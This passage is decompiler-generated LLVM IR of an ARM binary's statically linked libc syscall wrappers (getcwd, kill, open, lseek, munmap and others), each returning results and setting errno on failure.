  %v1_1005c = sub i32 0, %v0_1005c
  %v2_10060 = inttoptr i32 %v0_10058 to i32*
  store i32 %v1_1005c, i32* %v2_10060, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10068

dec_label_pc_10068:                               ; preds = %entry, %dec_label_pc_10058
  %v0_10068 = phi i32 [ %v0_10048, %entry ], [ -1, %dec_label_pc_10058 ]
  %v2_1006c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1006c, i32* %r4.global-to-local, align 4
  ret i32 %v0_10068

; uselistorder directives
  uselistorder i32 %v0_10048, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10068, { 1, 0 }
}

define i32 @__libc_fsync(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10070 = load i32, i32* @r4, align 4
  store i32 %v3_10070, i32* %stack_var_-8, align 4
  %v0_10074 = call i32 @fsync()
  store i32 %v0_10074, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10074, -4095
  br i1 %tmp, label %dec_label_pc_10094, label %dec_label_pc_10084

dec_label_pc_10084:                               ; preds = %entry
  %v0_10084 = call i32 @__errno_location()
  %v0_10088 = load i32, i32* %r4.global-to-local, align 4
  %v1_10088 = sub i32 0, %v0_10088
  %v2_1008c = inttoptr i32 %v0_10084 to i32*
  store i32 %v1_10088, i32* %v2_1008c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10094

dec_label_pc_10094:                               ; preds = %entry, %dec_label_pc_10084
  %v0_10094 = phi i32 [ %v0_10074, %entry ], [ -1, %dec_label_pc_10084 ]
  %v2_10098 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10098, i32* %r4.global-to-local, align 4
  ret i32 %v0_10094

; uselistorder directives
  uselistorder i32 %v0_10074, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10094, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_1009c = load i32, i32* @r4, align 4
  store i32 %v3_1009c, i32* %stack_var_-20, align 4
  %v6_1009c = load i32, i32* @r5, align 4
  %v9_1009c = load i32, i32* @r6, align 4
  %v12_1009c = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  %v2_100a0 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r5, align 4
  %v2_100ac = icmp eq i32 %arg1, 0
  br i1 %v2_100a0, label %dec_label_pc_100ac, label %dec_label_pc_100dc

dec_label_pc_100ac:                               ; preds = %entry
  br i1 %v2_100ac, label %dec_label_pc_100c8, label %dec_label_pc_100b4

dec_label_pc_100b4:                               ; preds = %dec_label_pc_100ac
  %v0_100b4 = call i32 @__errno_location()
  %v0_100b8 = load i32, i32* @r7, align 4
  store i32 %v0_100b8, i32* @r5, align 4
  %v2_100c0 = inttoptr i32 %v0_100b4 to i32*
  store i32 22, i32* %v2_100c0, align 4
  br label %dec_label_pc_1016c

dec_label_pc_100c8:                               ; preds = %dec_label_pc_100ac
  %v0_100c8 = call i32 @__GI_getpagesize()
  %v5_100d0 = icmp slt i32 %v0_100c8, 4096
  br i1 %v5_100d0, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_100c8
  store i32 %v0_100c8, i32* @r4, align 4
  br label %dec_label_pc_100ec

bb15:                                             ; preds = %dec_label_pc_100c8
  store i32 4096, i32* @r4, align 4
  br label %dec_label_pc_100ec

dec_label_pc_100dc:                               ; preds = %entry
  store i32 %arg2, i32* @r4, align 4
  br i1 %v2_100ac, label %dec_label_pc_100ec, label %bb16

bb16:                                             ; preds = %dec_label_pc_100dc
  store i32 %arg1, i32* @r6, align 4
  br label %dec_label_pc_100fc

dec_label_pc_100ec:                               ; preds = %dec_label_pc_100dc, %bb, %bb15
  %v0_100ec = phi i32 [ %v0_100c8, %bb ], [ 4096, %bb15 ], [ %arg2, %dec_label_pc_100dc ]
  %v1_100f0 = call i32 @malloc(i32 %v0_100ec)
  store i32 %v1_100f0, i32* @r6, align 4
  %v2_100f4 = icmp eq i32 %v1_100f0, 0
  br i1 %v2_100f4, label %dec_label_pc_10168, label %dec_label_pc_100ec.dec_label_pc_100fc_crit_edge

dec_label_pc_100ec.dec_label_pc_100fc_crit_edge:  ; preds = %dec_label_pc_100ec
  %v0_100fc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_100fc

dec_label_pc_100fc:                               ; preds = %bb16, %dec_label_pc_100ec.dec_label_pc_100fc_crit_edge
  %v0_10100 = phi i32 [ %v1_100f0, %dec_label_pc_100ec.dec_label_pc_100fc_crit_edge ], [ %arg1, %bb16 ]
  %v0_100fc = phi i32 [ %v0_100fc.pre, %dec_label_pc_100ec.dec_label_pc_100fc_crit_edge ], [ %arg2, %bb16 ]
  %v2_10104 = call i32 @getcwd(i32 %v0_10100, i32 %v0_100fc)
  store i32 %v2_10104, i32* @r4, align 4
  %tmp = icmp ult i32 %v2_10104, -4095
  br i1 %tmp, label %dec_label_pc_10124, label %dec_label_pc_10114

dec_label_pc_10114:                               ; preds = %dec_label_pc_100fc
  %v0_10114 = call i32 @__errno_location()
  %v0_10118 = load i32, i32* @r4, align 4
  %v1_10118 = sub i32 0, %v0_10118
  %v2_1011c = inttoptr i32 %v0_10114 to i32*
  store i32 %v1_10118, i32* %v2_1011c, align 4
  br label %dec_label_pc_10154

dec_label_pc_10124:                               ; preds = %dec_label_pc_100fc
  %v1_10124 = icmp slt i32 %v2_10104, 0
  br i1 %v1_10124, label %dec_label_pc_10154, label %dec_label_pc_1012c

dec_label_pc_1012c:                               ; preds = %dec_label_pc_10124
  %v0_1012c = load i32, i32* @r5, align 4
  %v2_1012c = icmp eq i32 %v0_1012c, 0
  br i1 %v2_1012c, label %bb17, label %dec_label_pc_10148.thread7

dec_label_pc_10148.thread7:                       ; preds = %dec_label_pc_1012c
  br label %dec_label_pc_1016c

bb17:                                             ; preds = %dec_label_pc_1012c
  %v1_10130 = load i32, i32* @r7, align 4
  %v3_10130 = icmp eq i32 %v1_10130, 0
  br i1 %v3_10130, label %dec_label_pc_10148, label %dec_label_pc_10148.thread

dec_label_pc_10148.thread:                        ; preds = %bb17
  br label %bb18

dec_label_pc_10148:                               ; preds = %bb17
  %v0_1013c = load i32, i32* @r6, align 4
  %v2_10140 = call i32 @realloc(i32 %v0_1013c, i32 %v2_10104)
  store i32 %v2_10140, i32* @r5, align 4
  %v2_10148 = icmp eq i32 %v2_10140, 0
  br i1 %v2_10148, label %bb18, label %dec_label_pc_1016c

bb18:                                             ; preds = %dec_label_pc_10148.thread, %dec_label_pc_10148
  %v1_1014c = load i32, i32* @r6, align 4
  store i32 %v1_1014c, i32* @r5, align 4
  br label %dec_label_pc_1016c

dec_label_pc_10154:                               ; preds = %dec_label_pc_10124, %dec_label_pc_10114
  %v0_10154 = load i32, i32* @r5, align 4
  %v2_10154 = icmp eq i32 %v0_10154, 0
  br i1 %v2_10154, label %dec_label_pc_1015c, label %dec_label_pc_10168

dec_label_pc_1015c:                               ; preds = %dec_label_pc_10154
  %v0_1015c = load i32, i32* @r6, align 4
  store i32 %v0_1015c, i32* @r0, align 4
  %v0_10160 = call i32 @free()
  br label %dec_label_pc_1016c

dec_label_pc_10168:                               ; preds = %dec_label_pc_10154, %dec_label_pc_100ec
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1016c

dec_label_pc_1016c:                               ; preds = %dec_label_pc_10148.thread7, %bb18, %dec_label_pc_10148, %dec_label_pc_1015c, %dec_label_pc_100b4, %dec_label_pc_10168
  %v0_1016c = load i32, i32* @r5, align 4
  %v2_10170 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10170, i32* @r4, align 4
  store i32 %v6_1009c, i32* @r5, align 4
  store i32 %v9_1009c, i32* @r6, align 4
  store i32 %v12_1009c, i32* @r7, align 4
  ret i32 %v0_1016c

; uselistorder directives
  uselistorder i32 %v2_10104, { 3, 1, 0, 2 }
  uselistorder i32 %v0_100c8, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 ()* @__GI_getpagesize, { 0, 3, 2, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1016c, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_100fc, { 1, 0 }
  uselistorder label %dec_label_pc_100ec, { 0, 2, 1 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10174 = load i32, i32* @r4, align 4
  store i32 %v3_10174, i32* %stack_var_-8, align 4
  %v0_1017c = load i32, i32* @r0, align 4
  store i32 %v0_1017c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1017c, -4095
  br i1 %tmp, label %dec_label_pc_10198, label %dec_label_pc_10188

dec_label_pc_10188:                               ; preds = %entry
  %v0_10188 = call i32 @__errno_location()
  %v0_1018c = load i32, i32* %r4.global-to-local, align 4
  %v1_1018c = sub i32 0, %v0_1018c
  %v2_10190 = inttoptr i32 %v0_10188 to i32*
  store i32 %v1_1018c, i32* %v2_10190, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1019c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10198

dec_label_pc_10198:                               ; preds = %entry, %dec_label_pc_10188
  %v2_1019c = phi i32 [ %v3_10174, %entry ], [ %v2_1019c.pre, %dec_label_pc_10188 ]
  %v0_10198 = phi i32 [ %v0_1017c, %entry ], [ -1, %dec_label_pc_10188 ]
  store i32 %v2_1019c, i32* @r4, align 4
  ret i32 %v0_10198

; uselistorder directives
  uselistorder i32 %v0_1017c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10198, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v2_101a4 = load i32, i32* @global_var_2f3e8.239, align 4
  %v2_101a8 = icmp eq i32 %v2_101a4, 0
  br i1 %v2_101a8, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_101b0 = phi i32 [ %v2_101a4, %entry ], [ 4096, %bb ]
  ret i32 %v1_101b0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_101b8 = load i32, i32* @r4, align 4
  store i32 %v3_101b8, i32* %stack_var_-8, align 4
  %v0_101bc = call i32 @getpid()
  store i32 %v0_101bc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_101bc, -4095
  br i1 %tmp, label %dec_label_pc_101dc, label %dec_label_pc_101cc

dec_label_pc_101cc:                               ; preds = %entry
  %v0_101cc = call i32 @__errno_location()
  %v0_101d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_101d0 = sub i32 0, %v0_101d0
  %v2_101d4 = inttoptr i32 %v0_101cc to i32*
  store i32 %v1_101d0, i32* %v2_101d4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_101dc

dec_label_pc_101dc:                               ; preds = %entry, %dec_label_pc_101cc
  %v0_101dc = phi i32 [ %v0_101bc, %entry ], [ -1, %dec_label_pc_101cc ]
  %v2_101e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_101e0, i32* @r4, align 4
  ret i32 %v0_101dc

; uselistorder directives
  uselistorder i32 %v0_101bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_101dc, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_101e4 = load i32, i32* @r4, align 4
  store i32 %v3_101e4, i32* %stack_var_-8, align 4
  %v0_101e8 = call i32 @getppid()
  store i32 %v0_101e8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_101e8, -4095
  br i1 %tmp, label %dec_label_pc_10208, label %dec_label_pc_101f8

dec_label_pc_101f8:                               ; preds = %entry
  %v0_101f8 = call i32 @__errno_location()
  %v0_101fc = load i32, i32* %r4.global-to-local, align 4
  %v1_101fc = sub i32 0, %v0_101fc
  %v2_10200 = inttoptr i32 %v0_101f8 to i32*
  store i32 %v1_101fc, i32* %v2_10200, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10208

dec_label_pc_10208:                               ; preds = %entry, %dec_label_pc_101f8
  %v0_10208 = phi i32 [ %v0_101e8, %entry ], [ -1, %dec_label_pc_101f8 ]
  %v2_1020c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1020c, i32* @r4, align 4
  ret i32 %v0_10208

; uselistorder directives
  uselistorder i32 %v0_101e8, { 1, 0, 2 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10208, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10210 = load i32, i32* @r4, align 4
  store i32 %v3_10210, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10234, label %dec_label_pc_10224

dec_label_pc_10224:                               ; preds = %entry
  %v0_10224 = call i32 @__errno_location()
  %v0_10228 = load i32, i32* %r4.global-to-local, align 4
  %v1_10228 = sub i32 0, %v0_10228
  %v2_1022c = inttoptr i32 %v0_10224 to i32*
  store i32 %v1_10228, i32* %v2_1022c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10238.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10234

dec_label_pc_10234:                               ; preds = %entry, %dec_label_pc_10224
  %v2_10238 = phi i32 [ %v3_10210, %entry ], [ %v2_10238.pre, %dec_label_pc_10224 ]
  %v0_10234 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_10224 ]
  store i32 %v2_10238, i32* @r4, align 4
  ret i32 %v0_10234

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10234, { 1, 0 }
}

define i32 @gettimeofday() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1023c = load i32, i32* @r4, align 4
  store i32 %v3_1023c, i32* %stack_var_-8, align 4
  %v0_10240 = call i32 @gettimeofday()
  store i32 %v0_10240, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10240, -4095
  br i1 %tmp, label %dec_label_pc_10260, label %dec_label_pc_10250

dec_label_pc_10250:                               ; preds = %entry
  %v0_10250 = call i32 @__errno_location()
  %v0_10254 = load i32, i32* %r4.global-to-local, align 4
  %v1_10254 = sub i32 0, %v0_10254
  %v2_10258 = inttoptr i32 %v0_10250 to i32*
  store i32 %v1_10254, i32* %v2_10258, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10260

dec_label_pc_10260:                               ; preds = %entry, %dec_label_pc_10250
  %v0_10260 = phi i32 [ %v0_10240, %entry ], [ -1, %dec_label_pc_10250 ]
  %v2_10264 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10264, i32* @r4, align 4
  ret i32 %v0_10260

; uselistorder directives
  uselistorder i32 %v0_10240, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10260, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_10284 = load i32, i32* @r0, align 4
  %v3_10284 = call i32 @ioctl(i32 %v0_10284, i32 %arg1, i32 %arg2)
  %v7_10288 = icmp eq i32 %v3_10284, -4096
  store i1 %v7_10288, i1* @cpsr_z, align 1
  store i32 %v3_10284, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_10284, -4095
  br i1 %tmp, label %dec_label_pc_102a4, label %dec_label_pc_10294

dec_label_pc_10294:                               ; preds = %entry
  %v0_10294 = call i32 @__errno_location()
  %v0_10298 = load i32, i32* %r4.global-to-local, align 4
  %v1_10298 = sub i32 0, %v0_10298
  %v2_1029c = inttoptr i32 %v0_10294 to i32*
  store i32 %v1_10298, i32* %v2_1029c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_102a4

dec_label_pc_102a4:                               ; preds = %entry, %dec_label_pc_10294
  %v0_102a4 = phi i32 [ %v3_10284, %entry ], [ -1, %dec_label_pc_10294 ]
  ret i32 %v0_102a4

; uselistorder directives
  uselistorder i32 %v3_10284, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_102a4, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_102b8 = load i32, i32* @r4, align 4
  store i32 %v3_102b8, i32* %stack_var_-8, align 4
  %v0_102bc = call i32 @kill()
  %v7_102c0 = icmp eq i32 %v0_102bc, -4096
  store i1 %v7_102c0, i1* @cpsr_z, align 1
  store i32 %v0_102bc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_102bc, -4095
  br i1 %tmp, label %dec_label_pc_102dc, label %dec_label_pc_102cc

dec_label_pc_102cc:                               ; preds = %entry
  %v0_102cc = call i32 @__errno_location()
  %v0_102d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_102d0 = sub i32 0, %v0_102d0
  %v2_102d4 = inttoptr i32 %v0_102cc to i32*
  store i32 %v1_102d0, i32* %v2_102d4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_102dc

dec_label_pc_102dc:                               ; preds = %entry, %dec_label_pc_102cc
  %v0_102dc = phi i32 [ %v0_102bc, %entry ], [ -1, %dec_label_pc_102cc ]
  %v2_102e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_102e0, i32* @r4, align 4
  ret i32 %v0_102dc

; uselistorder directives
  uselistorder i32 %v0_102bc, { 2, 0, 3, 1 }
  uselistorder i32 ()* @kill, { 7, 3, 5, 0, 4, 6, 2, 1 }
  uselistorder label %dec_label_pc_102dc, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10328, label %dec_label_pc_10314

dec_label_pc_10314:                               ; preds = %entry
  %v0_10314 = call i32 @__errno_location()
  %v0_10318 = load i32, i32* %r4.global-to-local, align 4
  %v1_10318 = sub i32 0, %v0_10318
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10320 = inttoptr i32 %v0_10314 to i32*
  store i32 %v1_10318, i32* %v2_10320, align 4
  %v0_10330.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10330

dec_label_pc_10328:                               ; preds = %entry
  %v2_10328 = icmp eq i32 %arg1, 0
  br i1 %v2_10328, label %dec_label_pc_1033c, label %dec_label_pc_10330

dec_label_pc_10330:                               ; preds = %dec_label_pc_10328, %dec_label_pc_10314
  %v0_10330 = phi i32 [ %arg1, %dec_label_pc_10328 ], [ %v0_10330.pre, %dec_label_pc_10314 ]
  br label %dec_label_pc_10340

dec_label_pc_1033c:                               ; preds = %dec_label_pc_10328
  br label %dec_label_pc_10340

dec_label_pc_10340:                               ; preds = %dec_label_pc_10330, %dec_label_pc_1033c
  %v14_10344 = phi i32 [ %v0_10330, %dec_label_pc_10330 ], [ %tmp9, %dec_label_pc_1033c ]
  ret i32 %v14_10344

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10340, { 1, 0 }
}

define i32 @_longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %v1_10348 = add i32 %arg1, 88
  %v2_10348 = inttoptr i32 %v1_10348 to i32*
  %v3_10348 = load i32, i32* %v2_10348, align 4
  %v2_1034c = icmp eq i32 %v3_10348, 0
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_1034c, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v1_10364 = xor i1 %v2_1034c, true
  call void @__pseudo_cond_branch(i1 %v1_10364, i32 ptrtoint (i32* @global_var_10934.547 to i32))
  %v0_10368 = load i32, i32* %r5.global-to-local, align 4
  %v2_10368 = icmp eq i32 %v0_10368, 0
  %.v0_10368 = select i1 %v2_10368, i32 1, i32 %v0_10368
  store i32 %.v0_10368, i32* @r1, align 4
  %v0_10374 = load i32, i32* %r4.global-to-local, align 4
  %v1_10378 = inttoptr i32 %v0_10374 to i32*
  %v2_10378 = call i32 @__longjmp(i32* %v1_10378)
  ret i32 %v2_10378

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1037c = load i32, i32* @r4, align 4
  store i32 %v3_1037c, i32* %stack_var_-8, align 4
  %v0_10380 = call i32 @lseek()
  store i32 %v0_10380, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10380, -4095
  br i1 %tmp, label %dec_label_pc_103a0, label %dec_label_pc_10390

dec_label_pc_10390:                               ; preds = %entry
  %v0_10390 = call i32 @__errno_location()
  %v0_10394 = load i32, i32* %r4.global-to-local, align 4
  %v1_10394 = sub i32 0, %v0_10394
  %v2_10398 = inttoptr i32 %v0_10390 to i32*
  store i32 %v1_10394, i32* %v2_10398, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_103a0

dec_label_pc_103a0:                               ; preds = %entry, %dec_label_pc_10390
  %v0_103a0 = phi i32 [ %v0_10380, %entry ], [ -1, %dec_label_pc_10390 ]
  %v2_103a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_103a4, i32* @r4, align 4
  ret i32 %v0_103a0

; uselistorder directives
  uselistorder i32 %v0_10380, { 1, 0, 2 }
  uselistorder label %dec_label_pc_103a0, { 1, 0 }
}

define i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_103a8 = load i32, i32* @r4, align 4
  store i32 %v3_103a8, i32* %stack_var_-8, align 4
  %v0_103ac = call i32 @msync()
  store i32 %v0_103ac, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_103ac, -4095
  br i1 %tmp, label %dec_label_pc_103cc, label %dec_label_pc_103bc

dec_label_pc_103bc:                               ; preds = %entry
  %v0_103bc = call i32 @__errno_location()
  %v0_103c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_103c0 = sub i32 0, %v0_103c0
  %v2_103c4 = inttoptr i32 %v0_103bc to i32*
  store i32 %v1_103c0, i32* %v2_103c4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_103cc

dec_label_pc_103cc:                               ; preds = %entry, %dec_label_pc_103bc
  %v0_103cc = phi i32 [ %v0_103ac, %entry ], [ -1, %dec_label_pc_103bc ]
  %v2_103d0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_103d0, i32* %r4.global-to-local, align 4
  ret i32 %v0_103cc

; uselistorder directives
  uselistorder i32 %v0_103ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_103cc, { 1, 0 }
}

define i32 @munmap() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_103d4 = load i32, i32* @r4, align 4
  store i32 %v3_103d4, i32* %stack_var_-8, align 4
  %v0_103d8 = call i32 @munmap()
  store i32 %v0_103d8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_103d8, -4095
  br i1 %tmp, label %dec_label_pc_103f8, label %dec_label_pc_103e8

dec_label_pc_103e8:                               ; preds = %entry
  %v0_103e8 = call i32 @__errno_location()
  %v0_103ec = load i32, i32* %r4.global-to-local, align 4
  %v1_103ec = sub i32 0, %v0_103ec
  %v2_103f0 = inttoptr i32 %v0_103e8 to i32*
  store i32 %v1_103ec, i32* %v2_103f0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_103f8

dec_label_pc_103f8:                               ; preds = %entry, %dec_label_pc_103e8
  %v0_103f8 = phi i32 [ %v0_103d8, %entry ], [ -1, %dec_label_pc_103e8 ]
  %v2_103fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_103fc, i32* @r4, align 4
  ret i32 %v0_103f8

; uselistorder directives
  uselistorder i32 %v0_103d8, { 1, 0, 2 }
  uselistorder i32 ()* @munmap, { 2, 0, 1 }
  uselistorder label %dec_label_pc_103f8, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10400 = load i32, i32* @r4, align 4
  store i32 %v3_10400, i32* %stack_var_-8, align 4
  %v0_10404 = call i32 @nanosleep()
  store i32 %v0_10404, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10404, -4095
  br i1 %tmp, label %dec_label_pc_10424, label %dec_label_pc_10414

dec_label_pc_10414:                               ; preds = %entry
  %v0_10414 = call i32 @__errno_location()
  %v0_10418 = load i32, i32* %r4.global-to-local, align 4
  %v1_10418 = sub i32 0, %v0_10418
  %v2_1041c = inttoptr i32 %v0_10414 to i32*
  store i32 %v1_10418, i32* %v2_1041c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10424

dec_label_pc_10424:                               ; preds = %entry, %dec_label_pc_10414
  %v0_10424 = phi i32 [ %v0_10404, %entry ], [ -1, %dec_label_pc_10414 ]
  %v2_10428 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10428, i32* @r4, align 4
  ret i32 %v0_10424

; uselistorder directives
  uselistorder i32 %v0_10404, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10424, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %v1_1043c = and i32 %arg1, 64
  store i32 %v1_1043c, i32* @r3, align 4
  %v2_1043c = icmp eq i32 %v1_1043c, 0
  br i1 %v2_1043c, label %.thread1, label %bb

bb:                                               ; preds = %entry
  store i32 %arg2, i32* @r3, align 4
  %phitmp = urem i32 %arg2, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_1044c = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_1044c, i32* @r2, align 4
  %v0_10454 = call i32 @open()
  %v7_10458 = icmp eq i32 %v0_10454, -4096
  store i1 %v7_10458, i1* @cpsr_z, align 1
  store i32 %v0_10454, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10454, -4095
  br i1 %tmp, label %dec_label_pc_10474, label %dec_label_pc_10464

dec_label_pc_10464:                               ; preds = %.thread1
  %v0_10464 = call i32 @__errno_location()
  %v0_10468 = load i32, i32* %r4.global-to-local, align 4
  %v1_10468 = sub i32 0, %v0_10468
  %v2_1046c = inttoptr i32 %v0_10464 to i32*
  store i32 %v1_10468, i32* %v2_1046c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10474

dec_label_pc_10474:                               ; preds = %.thread1, %dec_label_pc_10464
  %v0_10474 = phi i32 [ %v0_10454, %.thread1 ], [ -1, %dec_label_pc_10464 ]
  ret i32 %v0_10474

; uselistorder directives
  uselistorder i32 %v0_10454, { 2, 0, 3, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10474, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10490 = load i32, i32* @r0, align 4
  %v2_10490 = call i32 @__libc_open(i32 %v0_10490, i32 577)
  %v0_10494 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10494, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_10494 = and i32 %v2_10490, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_10494 = phi i32 [ %v2_10490, %entry ], [ %v6_10494, %bb ]
  ret i32 %v7_10494

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI___libc_open64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v1_104a8 = and i32 %arg1, 64
  %v2_104a8 = icmp eq i32 %v1_104a8, 0
  %v1_104b0 = or i32 %arg1, 131072
  br i1 %v2_104a8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_104c0 = load i32, i32* @r0, align 4
